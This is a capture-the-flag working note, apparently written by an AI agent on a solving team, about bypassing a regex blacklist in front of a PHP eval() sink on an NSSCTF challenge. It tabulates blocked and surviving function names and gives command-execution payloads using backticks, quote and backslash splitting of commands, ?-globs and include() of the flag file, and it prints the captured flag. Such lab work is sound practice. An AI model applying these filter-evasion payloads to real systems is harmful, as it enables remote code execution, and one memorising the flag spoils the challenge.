# Bypass / filter-reconstruction matrix — NSSCTF `node4.anna.nssctf.cn:24112`

Owner: agent-3 (task t3, lane B). Sink: `eval($_GET['code'])` behind
`preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i', $code)`.

**Legend**
* `OFFLINE` = verdict of a faithful Python replica of the server regex (`solve-lane-b.py`, `filter_verdict`),
  i.e. the payload string contains / does not contain a blacklisted substring.
* `LIVE` = what the server actually did on this instance. `OBSERVED` = real captured response;
  `UNTESTED` = derived only, never sent (the instance refused connections after the solve — every such row
  is marked so it cannot be mistaken for proof).
* `—` = not applicable.

## 1. Structural payload elements

| element | in blacklist? | consequence |
|---|---|---|
| `$` | yes | **no PHP variables**; `$_GET`, `$code`, `$a="x"` all rejected |
| `.` | yes | **no string concatenation**; no SQL/PHP dotted strings, no `index.php` literals |
| `*` + `+` | yes | no shell glob `*`, no regex quantifiers in payloads |
| `^` | yes | no PHP XOR string construction (`"a"^"b"`) |
| backtick `` ` `` | no | **shell exec available**: `` `cmd` `` |
| `;` `\|` `>` `<` `?` `[` `]` `/` `-` `_` `"` `'` `\` | no | chaining, piping, redirection, `?`-globs, quote/backslash splitting |
| `%0a` / `%3B` | — | URL-encoding is decoded by PHP *before* `preg_match`, so encoded keywords are still caught; no bypass |

## 2. Command / function name survival (the core of the challenge)

| name | OFFLINE | LIVE | note |
|---|---|---|---|
| `ls` | REJECT (`ls`) | — | blocked |
| `cat`, `tac` | REJECT | — | blocked |
| `head`, `tail` | REJECT | — | blocked |
| `more`, `less` | REJECT | — | blocked |
| `cp` | REJECT | — | blocked |
| `system`, `passthru` | REJECT (`sys`/`pas`) | — | blocked |
| `shell_exec` | REJECT (`shell`) | — | blocked |
| `scandir` | REJECT (`scan`) | **OBSERVED** `你想干什么？？？？？？？？？` | proven rejection |
| `readfile`, `file_get_contents`, `highlight_file`, `show_source`, `readgzfile` | REJECT (`read`/`file`/`high`) | — | blocked |
| `phpinfo`, `base64_decode`, `hex2bin` | REJECT (`php`/`base`/`hex2bin`) | — | blocked |
| `echo` | REJECT (`echo`) | — | blocked (use `print`) |
| `find` | ACCEPT | **OBSERVED** full `/` listing | ✔ used in the winning route |
| `include` / `require` | ACCEPT | **OBSERVED** printed `NSSCTF{This_IS_s0_easy_RCE}` | ✔ winning route (pure PHP) |
| `print`, `printf`, `print_r`, `var_dump` | ACCEPT | **OBSERVED** (all used) | |
| `exec` | ACCEPT | offline ACCEPT; body UNTESTED | `exec` returns only the **last line** of output |
| `glob` | ACCEPT | **OBSERVED** returned `Array ( )` for the wrong width | see the glob trap |
| `getcwd`, `get_defined_vars` | ACCEPT | UNTESTED (connection lost) | valid future probes |
| `nl`, `od`, `sort`, `rev`, `awk`, `sed`, `grep`, `dir`, `uniq`, `dd`, `xxd`, `tar` | ACCEPT | `nl` **OBSERVED** by lane A (captain re-read the flag with it) | reader pool |
| `popen`, `proc_open` | ACCEPT | UNTESTED | alternative exec |
| `assert`, `die` | ACCEPT | UNTESTED | no help on its own (`die` only ends) |

## 3. Reconstruction matrix (string synthesis → shell re-joining)

| # | technique | payload (PHP source) | OFFLINE | LIVE |
|---|---|---|---|---|
| 3.1 | quote-split `ls` | ``print(`l""s /`);`` | ACCEPT | UNTESTED |
| 3.2 | quote-split `cat` | ``print(`c""at /fffffffffflagafag`);`` | ACCEPT | UNTESTED |
| 3.3 | quote-split `head` | ``print(`h""ead -1 /fffffffffflagafag`);`` | ACCEPT | UNTESTED |
| 3.4 | backslash-split `ls` | ``print(`l\s /`);`` | ACCEPT | UNTESTED |
| 3.5 | backslash-split `cat` | ``print(`\c\a\t /fffffffffflagafag`);`` | ACCEPT | UNTESTED |
| 3.6 | exact name, no shell | `include("/fffffffffflagafag");` | ACCEPT | **OBSERVED: flag** |
| 3.7 | `?`-glob, right width | `print_r(glob("/f????????????????"));` (`f` + 16 `?` = 17 chars) | ACCEPT | UNTESTED (consistent with 3.8) |
| 3.8 | `?`-glob, wrong width | `print_r(glob("/f????"));` | ACCEPT | **OBSERVED: `Array ( )`** — see trap |
| 3.9 | shell glob `*` | ``print(`sort /f*`);`` | **REJECT** (`*`) | **OBSERVED** rejection |
| 3.10 | shell glob `*` | ``print(`grep NSSCTF /f*`);`` | **REJECT** (`*`) | **OBSERVED** rejection |
| 3.11 | shell glob `*` | ``print(`nl /f*`);`` | **REJECT** (`*`) | **OBSERVED** rejection |
| 3.12 | exact name shell reader | ``print(`nl /fffffffffflagafag`);`` | ACCEPT | **OBSERVED** by lane A: `1<TAB>NSSCTF{...}` |
| 3.13 | exact name shell reader | ``print(`grep NSSCTF /fffffffffflagafag`);`` | ACCEPT | UNTESTED |
| 3.14 | pipe chain | ``print(`a""ls / \| grep f`);`` → tricky: `\|` fine | ACCEPT | UNTESTED |
| 3.15 | redirection to second stage | ``print(`find / -maxdepth 2 > /tmp/o`);`` then `include("/tmp/o");` | ACCEPT | UNTESTED (redundant here) |
| 3.16 | PHP XOR/concat string building | `("A"^"B")` / `"a"."b"` | **REJECT** (`^` / `.`) | — closed |
| 3.17 | URL-encoded keywords | `%6c%73` for `ls` | decoded before regex → REJECT | — no bypass |
| 3.18 | `$`-free callback abuse | `array_map`, `call_user_func` | ACCEPT as names, but useless without `$`/strings | UNTESTED, low value |

## 4. The glob trap (cite this in the writeup)

`glob("/f????")` **passes the filter** and returns an **empty array** — no warning, no error. The real
flag file is `/fffffffffflagafag` (basename **17 chars**: `ffffffffff` + `lagafag`; full path 18), so every
`?`-width except the right one is indistinguishable from "there is no flag at `/`". Enumerate with
`` `find / -maxdepth 1` `` instead of guessing glob widths, or use exactly 1 `f` + 16 `?`.

## 5. Net result

Exact-name readers + `include`/`require`/`find` are the reliable path; `*` globs, `scan*`, and every
`$`/`.`/`+`/`^` construct are hard dead ends; `?`-globs and quote/backslash splitting are sound but were
not re-verified live because the instance was torn down after the solve. Flag
`NSSCTF{This_IS_s0_easy_RCE}` — routes and raw evidence in `lane-b.md`.
